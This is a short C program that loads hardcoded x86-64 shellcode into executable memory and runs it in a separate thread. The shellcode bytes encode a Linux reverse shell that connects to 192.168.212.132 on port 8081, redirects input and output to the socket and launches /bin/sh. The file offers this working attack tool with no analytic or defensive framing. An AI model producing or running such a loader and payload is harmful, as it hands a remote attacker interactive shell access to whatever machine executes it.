// Include the necessary libraries for memory management and threading
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <pthread.h>
#include <unistd.h>

// This is a global variable that will hold the address of the allocated memory
void *exec_mem;

// This is the function that the new thread will execute
void *thread_func(void *arg) {
    // Declare a function pointer
    void (*func)();

    // Set the function pointer to point to the shellcode
    func = (void (*)())exec_mem;

    // Call the function (i.e., execute the shellcode)
    (void)(*func)();

    return NULL;
}

int main() {
    // Your shellcode goes here
    char shellcode[] = {
	    "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"  
"\x48\xb9\x02\x00\x1f\x91\xc0\xa8\xd4\x84\x51\x48\x89\xe6"  
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"  
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"  
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"  
"\x89\xe6\x0f\x05"
    };

    // Get the size of the shellcode
    int shellcode_size = sizeof(shellcode);

    // Allocate a region of memory with execution permissions
    // PROT_READ | PROT_WRITE | PROT_EXEC sets the memory to be readable, writable, and executable
    // MAP_ANON | MAP_PRIVATE creates a private anonymous mapping, which means the memory is initialized to zero and not backed by a file
    exec_mem = mmap(NULL, shellcode_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);

    // Copy the shellcode to the allocated memory
    memcpy(exec_mem, shellcode, shellcode_size);

    // Declare a pthread_t variable to hold the thread ID
    pthread_t thread;

    // Create a new thread that executes thread_func()
    // The new thread starts execution at thread_func() and the argument passed to thread_func() is NULL
    pthread_create(&thread, NULL, thread_func, NULL);

    // Wait for the new thread to terminate
    pthread_join(thread, NULL);

    return 0;
}
